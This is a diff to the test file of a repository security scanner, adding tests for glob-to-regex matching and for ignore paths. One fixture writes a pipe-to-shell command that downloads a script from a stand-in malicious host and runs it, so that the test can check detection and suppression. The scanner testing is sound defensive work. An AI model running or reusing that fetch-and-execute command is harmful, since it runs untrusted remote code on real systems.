@@ -2,7 +2,7 @@ import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
-import { scanRepo, sortFindings } from '../src/scanner.js';
+import { globToRegExp, scanRepo, sortFindings } from '../src/scanner.js';
 import { Finding } from '../src/types.js';
 
 // assembled at runtime so secret scanners don't flag the test fixture
@@ -51,5 +51,26 @@ describe('sortFindings', () => {
     });
     const sorted = sortFindings([f('low'), f('critical'), f('medium')]);
     expect(sorted.map((x) => x.severity)).toEqual(['critical', 'medium', 'low']);
+  });
+});
+
+describe('globToRegExp & scanRepo ignore', () => {
+  it('supports **, * and ? globs', () => {
+    expect(globToRegExp('vendor/**').test('vendor/a/b.sh')).toBe(true);
+    expect(globToRegExp('**/fixtures/**').test('a/b/fixtures/c.ts')).toBe(true);
+    expect(globToRegExp('*.sh').test('install.sh')).toBe(true);
+    expect(globToRegExp('*.sh').test('a/install.sh')).toBe(false);
+    expect(globToRegExp('a?c.ts').test('abc.ts')).toBe(true);
+    expect(globToRegExp('packages/*/test/**').test('packages/cli/test/x.ts')).toBe(true);
+    expect(globToRegExp('packages/*/test/**').test('packages/cli/src/x.ts')).toBe(false);
+  });
+
+  it('excludes ignored paths from repo scans', () => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agentgate-scan-ignore-'));
+    fs.mkdirSync(path.join(dir, 'vendor'));
+    fs.writeFileSync(path.join(dir, 'vendor', 'install.sh'), 'curl https://evil.sh/install | sh\n');
+    expect(scanRepo(dir).findings.length).toBeGreaterThan(0);
+    expect(scanRepo(dir, { ignore: ['vendor/**'] }).findings).toHaveLength(0);
+    fs.rmSync(dir, { recursive: true, force: true });
   });
 });
